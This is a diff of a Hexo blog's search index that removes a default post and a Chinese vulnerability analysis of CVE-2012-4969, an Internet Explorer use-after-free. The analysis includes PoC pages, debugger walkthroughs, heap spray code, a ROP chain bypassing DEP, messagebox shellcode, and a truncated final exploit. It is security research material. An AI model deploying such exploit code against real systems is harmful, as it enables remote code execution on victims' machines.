@@ -423,24 +423,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2021/03/31/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>EFS Web Server 7.2远程代码执行漏洞分析</title>
     <url>/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><ul>
@@ -584,204 +566,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CVE-2012-4969漏洞分析</title>
-    <url>/2021/04/28/CVE-2012-4969%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
-<li><p>漏洞编号：CVE-2012-4969</p>
-</li>
-<li><p>漏洞类型：UAF</p>
-</li>
-<li><p>漏洞影响：远程代码执行</p>
-</li>
-<li><p>CVSS分数：9.3</p>
-</li>
-<li><p>概述：mshtml.dll的CMshtmlEd :: Exec()函数将CMshtmlEd对象释放后，又再次使用相同的内存，从而导致释放后使用的情况</p>
-</li>
-</ul>
-<span id="more"></span>
-
-<h3 id="2-漏洞影响"><a href="#2-漏洞影响" class="headerlink" title="2. 漏洞影响"></a>2. 漏洞影响</h3><p>Internet Explorer 6 至 9</p>
-<h3 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h3><p><a href="http://go.microsoft.com/fwlink/?linkid=255505">MS12-063</a></p>
-<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
-<li>靶机环境版本<ul>
-<li>win7 sp1 x86</li>
-</ul>
-</li>
-<li>靶机配置<ul>
-<li>IE 8</li>
-</ul>
-</li>
-</ul>
-<h3 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2. 复现过程"></a>2. 复现过程</h3><p>使用<a href="https://www.rapid7.com/db/modules/exploit/windows/browser/ie_execcommand_uaf/">metastploit模块</a>获取poc1，LLmya.html</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> arrr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        arrr[<span class="number">0</span>] = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">        arrr[<span class="number">0</span>][<span class="string">&quot;src&quot;</span>] = <span class="string">&quot;E&quot;</span>;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe src=<span class="string">&quot;./UGuQTe.html&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>poc2，UGuQTe.html，两个文件保存在同一个目录下</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;HTML&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcB</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.execCommand(<span class="string">&quot;selectAll&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">funcA</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.write(<span class="string">&quot;O&quot;</span>);</span><br><span class="line">      parent.arrr[<span class="number">0</span>].src = <span class="string">&quot;YMjf\u0c08\u0c0cKDogjsiIejengNEkoPDjfiJDIWUAzdfghjAAuUFGGBSIPPPUDFJKSOQJGH&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;body onload=<span class="string">&#x27;funcB();&#x27;</span> onselect=<span class="string">&#x27;funcA()&#x27;</span>&gt;</span><br><span class="line">    &lt;div contenteditable=<span class="string">&#x27;true&#x27;</span>&gt;</span><br><span class="line">      a</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
-
-<p>运行程序poc1，触发漏洞</p>
-<img src="https://i.loli.net/2021/04/28/SqYwjWOAFfga5tG.png" style="zoom:80%;" />
-
-<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><ul>
-<li>漏洞文件：mshtml.dll</li>
-<li>漏洞函数：mshtml!CMshtmlEd::Exec</li>
-<li>漏洞对象：CMshtmlEd</li>
-</ul>
-<h3 id="2-详细分析"><a href="#2-详细分析" class="headerlink" title="2. 详细分析"></a>2. 详细分析</h3><h4 id="漏洞函数分析"><a href="#漏洞函数分析" class="headerlink" title="漏洞函数分析"></a>漏洞函数分析</h4><p>设置hpa，ust堆调试属性，使用windbg调试IE浏览器，执行poc1，漏洞触发</p>
-<img src="https://i.loli.net/2021/04/28/13fTuF62Ysmbdqc.png" style="zoom:80%;" />
-
-<p>查看edi的值</p>
-<img src="https://i.loli.net/2021/04/28/mquAWDSOBjeQ3sI.png" style="zoom:80%;" />
-
-<p>查看函数调用堆栈</p>
-<img src="https://i.loli.net/2021/04/28/gGW9eJlAZ8cEw14.png" style="zoom:80%;" />
-
-<p>IDA中反汇编函数CMshtmlEd::Exec，由于win7中打开了ASLR，所以只能靠地址的后两个字节定位漏洞触发点68b8503e。这里是edi地址引用错误，在函数中往前查看edi的赋值情况，edi只有一次赋值且为this指针（不排除中间函数更改edi的可能，需要动态调试验证）</p>
-<img src="https://i.loli.net/2021/04/28/vtwTVmWeHfqEBSU.png" style="zoom:80%;" />
-
-<p>在CMshtmlEd::Exec设置断点，单步执行查看edi的变化情况</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bp mshtml!CMshtmlEd::Exec</span><br></pre></td></tr></table></figure>
-
-<p>edi第一次赋值，查看堆的结构，得知edi指向CMshtmlEd实例的虚表</p>
-<img src="https://i.loli.net/2021/04/28/ENT2Pa7Y6cb8oZI.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/04/28/PqcTeFpbQ4xAMzL.png" style="zoom:80%;" />
-
-<p>继续执行到触发异常点，edi还是指向同一个地方，但是!heap -p -a edi已经没有输出了，说明edi指向的堆已经不存在，大概率为释放后重利用漏洞</p>
-<img src="https://i.loli.net/2021/04/28/dMGswOgaxYC6oDN.png" style="zoom:80%;" />
-
-<p>下一步查看CMshtmlEd实例的释放过程，先找到与CMshtmlEd类有关的函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x mshtml!CmshtmlEd::*</span><br></pre></td></tr></table></figure>
-
-<img src="https://i.loli.net/2021/04/28/Luk8OHGdIZCS3Jm.png" style="zoom:80%;" />
-
-<p>重点关注的函数</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CMshtmlEd::Release</span><br><span class="line">CMshtmlEd::~CMshtmlEd</span><br></pre></td></tr></table></figure>
-
-<p>不过析构函数一般是与free一起调用的，查看CMshtmlEd::~CMshtmlEd，发现由CMshtmlEd::Release调用，查看release，有一处跳转执行free，所以就在CMshtmlEd::Release下断点</p>
-<img src="https://i.loli.net/2021/04/28/98Avw2hXiVaWsq7.png" style="zoom:80%;" />
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:005&gt; bp mshtml!CMshtmlEd::Exec	&#x2F;&#x2F;漏洞函数</span><br><span class="line">0:005&gt; g</span><br><span class="line">0:005&gt; bp mshtml!CMshtmlEd::Release</span><br></pre></td></tr></table></figure>
-
-<p>运行到漏洞函数CMshtmlEd::Exec时设置CMshtmlEd::Release断点，第一次执行到Release函数没有跳转执行free，第二次执行时调用了free函数</p>
-<img src="https://i.loli.net/2021/04/28/uN9TgrlI4yxdmDZ.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/04/28/ct5nWfCd1Eob4PO.png" style="zoom:80%;" />
-
-<p>查看HeapFree函数的参数，第三个为this指针08178f78</p>
-<img src="https://i.loli.net/2021/04/28/SdsWlFMjyxHivIN.png" style="zoom:80%;" />
-
-<p>继续执行之后就触发了异常，同时edi也是08178f78，与被free掉的this指针相同，说明this指针在被释放后了又进行引用导致UAF漏洞</p>
-<img src="https://i.loli.net/2021/04/28/6eS9yAYkmXWMHna.png" style="zoom:80%;" />
-
-<p>那么，CMshtmlEd::Release的调用在漏洞函数CMshtmlEd::Exec哪里执行呢，查看CMshtmlEd::Exec，在漏洞触发点mov edi, dword ptr [edi+8]之前存在一个函数CCommand::Exec，需要使用edi指针，为什么执行之后就忽然edi指向的实例不存在了？</p>
-<img src="https://i.loli.net/2021/04/28/AHsRySzUPcvexgI.png" style="zoom:80%;" />
-
-<p>执行CCommamd::Exec之前查看edi</p>
-<img src="https://i.loli.net/2021/04/28/jTlKouQhUiGxEkL.png" style="zoom:80%;" />
-
-<p>执行之后，edi指向的this指针已经被free掉了，之后执行mov edi, dword ptr [edi+8]，导致异常。</p>
-<img src="https://i.loli.net/2021/04/28/jYK9ySC1wMVxU6O.png" style="zoom:80%;" />
-
-<p>验证：执行到CMshtmlEd::Exec时下断点mshtml!CMshtmlEd::Release和mshtml!CCommand::Exec，程序先后在CCommand::Exec和CMshtmlEd::Release断下，并执行了Heapfree函数，说明CCommand::Exec中释放了this指针</p>
-<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p>windbg结合JavaScript调试，确定poc何处引发漏洞</p>
-<p>查看CMshtmlEd实例的构造和释放过程，在IDA中查看CMshtmlEd::CMshtmlEd的引用函数AddCommandTarget和GetCommandTarget，都在分配了堆之后调用了CMshtmlEd的构造函数，所以关注构造函数就能直到堆的引用过程</p>
-<p>AddCommandTarget函数</p>
-<img src="https://i.loli.net/2021/04/28/nw7hlSOz1KsMgE6.png" style="zoom:80%;" />
-
-<p>GetCommandTarget函数</p>
-<img src="https://i.loli.net/2021/04/28/anQizWKlIpcxY2b.png" style="zoom:80%;" />
-
-<p>在构造函数和release函数下断点</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bp mshtml!CMshtmlEd::CMshtmlEd</span><br><span class="line">bp mshtml!CMshtmlEd::Release</span><br></pre></td></tr></table></figure>
-
-<p>执行funcB()时命中构造函数，查看函数参数this指针，这里由edx保存，堆为bb9af78</p>
-<img src="https://i.loli.net/2021/04/28/Ltxey6du1UwNY8b.png" style="zoom:80%;" />
-
-<p>继续执行第二次命中构造函数，创建堆9e52f78</p>
-<img src="https://i.loli.net/2021/04/28/FBZma8v15jWzTGl.png" style="zoom:80%;" />
-
-<p>之后命中release，没有调用heapfree，然后执行funcA()</p>
-<img src="https://i.loli.net/2021/04/28/IszAXy1kEKHTWUq.png" style="zoom:80%;" />
-
-<p>命中release，没有调用heapfree，又一次命中release，可以看到这里释放的堆为9e52f78</p>
-<img src="https://i.loli.net/2021/04/28/wQJT75BWpPqt9l2.png" style="zoom:80%;" />
-
-<p>然后引发了一个奇怪的异常，可能是由于JavaScript调试导致</p>
-<img src="https://i.loli.net/2021/04/28/vxizql73fILC9M6.png" style="zoom:80%;" />
-
-<p>不过可以确定时funcA()引起的，write常常会触发对象释放，后面对arrr[0].src赋值是一个占位动作</p>
-<img src="https://i.loli.net/2021/04/28/wRECpDSkes7JZGu.png" style="zoom:80%;" />
-
-
-
-<h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><h3 id="1-利用环境"><a href="#1-利用环境" class="headerlink" title="1. 利用环境"></a>1. 利用环境</h3><ul>
-<li><p>win7 sp1 x86</p>
-</li>
-<li><p>jdk1.6，其中MSVCR71.dll模块没有开启ASLR</p>
-</li>
-<li><p>kali2.0</p>
-</li>
-</ul>
-<h3 id="2-利用过程"><a href="#2-利用过程" class="headerlink" title="2. 利用过程"></a>2. 利用过程</h3><p>在CMshtmlEd对象被释放后，继续调用了vtable中的 [vtable + 8]函数，如果能够构造个虚假的地址将vtable占位，即可试下uaf利用。poc中parent.arrr[0]赋值实现了占位，程序，虚表指针edi+8指向了0c0c0c08</p>
-<img src="https://i.loli.net/2021/04/28/b26GFigtlxzZaJM.png" style="zoom:80%;" />
-
-<img src="https://i.loli.net/2021/04/28/ambqAG7OMvURsBS.png" style="zoom:80%;" />
-
-<p>接着运行程序，调用了[[edi]+8]，我们要向控制0c0c0c08处写入ROP和shellcode</p>
-<img src="https://i.loli.net/2021/04/28/soPnVDYWwrGvhdK.png" style="zoom:80%;" />
-
-<p>Heap Spray，利用JavaScript String对象在内存中申请大量的堆块，堆一直占用直到地址0c0c0c0c，同时每一个分配的堆块结构sildecode+shellcode，sildecode为nop等滑板指令，劫持程序执行流到任何一个堆块（本例为0c0c0c0c）中都能够执行shellcode，在win7等开启了DEP和ASLR的系统，要构造ROP调用VirtualProtect以关闭dep，而且ROP位置要精准</p>
-<p>为了实现shellcode精准到内存中指定位置：堆的大小和内部结构要非常精确，可以使用js的heaplib库，本次分析使用手动构造堆块。堆块进行分配的时候，因为堆块对齐，低4位10000大小的地址不会变化。举个例子，如果一个堆分配的低4位地址002c，那么其他堆的低位同为002c，只要以0x1000为单位进行构造堆块，那每个块结构机制都可轻易确定，如下图，low_offset固定，但high_offset不一定相同，当然每个shellcode块之间不能有空隙，不然会执行到0000的空隙字符</p>
-<img src="https://i.loli.net/2021/04/28/xJhtX1jDaR5OQyo.png" style="zoom:80%;" />
-
-<p>堆喷射代码，block结构，filler填充0020到0c0c到的内存，nop继续填充满1000字节</p>
-<img src="https://i.loli.net/2021/04/28/dZhWkiue2nczSoJ.png" style="zoom:80%;" />
-
-<p>分配200MB的block，4字节bstr头适应js的string对象，最后以2个字节结尾</p>
-<img src="https://i.loli.net/2021/04/28/BPsjkDhzIRu4LfM.png" style="zoom:80%;" />
-
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> arrr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        arrr[<span class="number">0</span>] = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">        arrr[<span class="number">0</span>][<span class="string">&quot;src&quot;</span>] = <span class="string">&quot;E&quot;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params">len, str</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (str.length &lt; len)</span><br><span class="line">                str += str;</span><br><span class="line">            <span class="keyword">return</span> str.substr(<span class="number">0</span>, (len - <span class="number">6</span>) / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> block_size = <span class="number">0x1000</span> / <span class="number">2</span>; <span class="comment">//一页大小</span></span><br><span class="line">        <span class="keyword">var</span> offset = (<span class="number">0x0c0c</span> - <span class="number">0x0020</span> - <span class="number">4</span>) / <span class="number">2</span>; <span class="comment">// shellcode在块中的偏移</span></span><br><span class="line">        <span class="keyword">var</span> filler = <span class="built_in">unescape</span>(<span class="string">&quot;%u0c0c&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (filler.length &lt; offset) &#123;</span><br><span class="line">            filler += filler;</span><br><span class="line">        &#125;</span><br><span class="line">        filler = filler.substring(<span class="number">0</span>, offset);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u7546%u7a7a%u5379&quot;</span> + <span class="string">&quot;%u6365%u7275%u7469&quot;</span> + <span class="string">&quot;%u9079&quot;</span>);<span class="comment">// FuzzySecurity的ascii，仅仅作为标识</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> nop = <span class="built_in">unescape</span>(<span class="string">&quot;%u9090&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_size; i++) &#123;</span><br><span class="line">            nop += <span class="built_in">unescape</span>(<span class="string">&quot;%u9090&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        nop = nop.substring(<span class="number">0</span>, block_size - shellcode.length - filler.length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> block = filler + shellcode + nop;</span><br><span class="line">        block = alloc(<span class="number">0x100000</span>-<span class="number">0x10</span>, block);</span><br><span class="line">        len_block = block.length;</span><br><span class="line">        heap_chunks = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">150</span>; i++) &#123;</span><br><span class="line">            heap_chunks[i] = block.substr(<span class="number">0</span>, block.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;iframe src=<span class="string">&quot;../hpIpD0pjgv/UGuQTe.html&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>堆内存，90000为!peb的得到的进程堆基址，堆占用了99.46，每块大小为ffff0</p>
-<img src="https://i.loli.net/2021/04/28/GarvRPtu5koDbmU.png" style="zoom:80%;" />
-
-<p>筛选大小为ffff0的堆块，可以看到每个堆块低位均为0020</p>
-<img src="https://i.loli.net/2021/04/28/yBTpPR8frbaq5xE.png" style="zoom:80%;" />
-
-<p>搜索shellcode “FuzzySecurity”，可以看到每个shellcode间隔为1000，正好为我们构造的block，一部分内存已被block铺满，没有空隙</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">s -a 0x00000000 L?7fffffff &quot;FuzzySecurity&quot;</span><br></pre></td></tr></table></figure>
-
-<img src="https://i.loli.net/2021/04/28/FwXmCNbqUK2B5nO.png" style="zoom:80%;" />
-
-<p>构造ROP</p>
-<p>为了绕过win7的dep和ASLR，需要构造ROP调用VirtualProtect以关闭dep，win7浏览器会加载jdk1.6，其中有两个模块没有开启ASLR的模块，mona插件查询ROP</p>
-<img src="https://i.loli.net/2021/04/28/sj5zBXASwLkZTKe.png" style="zoom:80%;" />
-
-<p>自动生成ROP链，有问题需稍加修改，之后更改ROP以令程序执行call dword ptr [eax+8]时能够跳转到ROP，具体为迁移栈到0c0c0c0c</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">!py mona rop -m <span class="string">&quot;MSVCR71.dll, jp2ssv.dll&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line"><span class="keyword">var</span> rop_gadgets = <span class="built_in">unescape</span>(</span><br><span class="line">    <span class="string">&quot;%u5b4f%u7c36&quot;</span> + <span class="comment">// 0x7c365b4f : ,# POP EBX # POP EBP # RET [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u0201%u0000&quot;</span> + <span class="comment">// 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">    <span class="string">&quot;%u8b05%u7c34&quot;</span> + <span class="comment">// 0x7c348b05: ,# XCHG EAX,ESP # RETN</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebp:---] :</span></span><br><span class="line">    <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# POP EBP # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u6d28%u7c35&quot;</span> + <span class="comment">// 0x7c356d28 : ,# skip 4 bytes [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ebx:---] :</span></span><br><span class="line">    <span class="comment">// &quot;%u09cf%u7c36&quot; + // 0x7c3609cf : ,# POP EBX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="comment">// &quot;%u0201%u0000&quot; + // 0x00000201 : ,# 0x00000201-&gt; ebx</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edx:---] :</span></span><br><span class="line">    <span class="string">&quot;%u4f8e%u7c34&quot;</span> + <span class="comment">// 0x7c344f8e : ,# POP EDX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u0040%u0000&quot;</span> + <span class="comment">// 0x00000040 : ,# 0x00000040-&gt; edx</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_ecx:---] :</span></span><br><span class="line">    <span class="string">&quot;%u8ab2%u7c35&quot;</span> + <span class="comment">// 0x7c358ab2 : ,# POP ECX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%uf2a1%u7c38&quot;</span> + <span class="comment">// 0x7c38f2a1 : ,# &amp;Writable location [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_edi:---] :</span></span><br><span class="line">    <span class="string">&quot;%ue239%u7c36&quot;</span> + <span class="comment">// 0x7c36e239 : ,# POP EDI # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%ud202%u7c34&quot;</span> + <span class="comment">// 0x7c34d202 : ,# RETN (ROP NOP) [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:gadgets_to_set_esi:---] :</span></span><br><span class="line">    <span class="string">&quot;%uf8f8%u7c34&quot;</span> + <span class="comment">// 0x7c34f8f8 : ,# POP ESI # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u15a2%u7c34&quot;</span> + <span class="comment">// 0x7c3415a2 : ,# JMP [EAX] [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%u6747%u7c37&quot;</span> + <span class="comment">// 0x7c376747 : ,# POP EAX # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;%ua151%u7c37&quot;</span> + <span class="comment">// 0x7c37a140 : ,# ptr to &amp;VirtualProtect() [IAT MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:pushad:---] :</span></span><br><span class="line">    <span class="string">&quot;%u8c81%u7c37&quot;</span> + <span class="comment">// 0x7c378c81 : ,# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]</span></span><br><span class="line">    <span class="string">&quot;&quot;</span> + <span class="comment">// #[---INFO:extras:---] :</span></span><br><span class="line">    <span class="string">&quot;%u5c30%u7c34&quot;</span> + <span class="comment">// 0x7c345c30 : ,# ptr to &#x27;push esp # ret &#x27; [MSVCR71.dll]</span></span><br><span class="line"><span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>kali生成shellcode，以js小端序输出</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfvenom -p windows/messagebox -f js_le</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 272 bytes</span><br><span class="line">Final size of js_le file: 816 bytes</span><br><span class="line"><span class="meta">%</span><span class="bash">uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u5878%u6820%u6761%u4265%u4d68%u7365%u3173%u88db%u245c%u890a%u68e3%u2058%u2020%u4d68%u4653%u6821%u6f72%u206d%u6f68%u202c%u6866%u6548%u6c6c%uc931%u4c88%u1024%ue189%ud231%u5352%u5251%ud0ff%uc031%uff50%u0855</span></span><br></pre></td></tr></table></figure>
-
-<p>最终exploit</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> arrr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">        arrr[<span class="number">0</span>] = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">        arrr[<span class="number">0</span>][<span class="string">&quot;src&quot;</span>] = <span class="string">&quot;E&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params">len, str</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (str.length &lt; len)</span><br><span class="line">                str += str;</span><br><span class="line">            <span class="keyword">return</span> str.substr(<span class="number">0</span>, (len - <span class="number">6</span>) / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> block_size = <span class="number">0x1000</span> / <span class="number">2</span>; <span class="comment">//一页大小</span></span><br><span class="line">        <span class="keyword">var</span> offset = (<span class="number">0x0c0c</span> - <span class="number">0x0020</span> - <span class="number">4</span>) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> filler = <span class="built_in">unescape</span>(<span class="string">&quot;%u0c0c&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (filler.length &lt; offset) &#123;</span><br><span class="line">            filler += filler;</span><br><span class="line">        &#125;</span><br><span class="line">        filler = filler.substring(<span class="number">0</span>, offset);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// msfvenom -p windows/messagebox -f js_le</span></span><br><span class="line">        <span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span 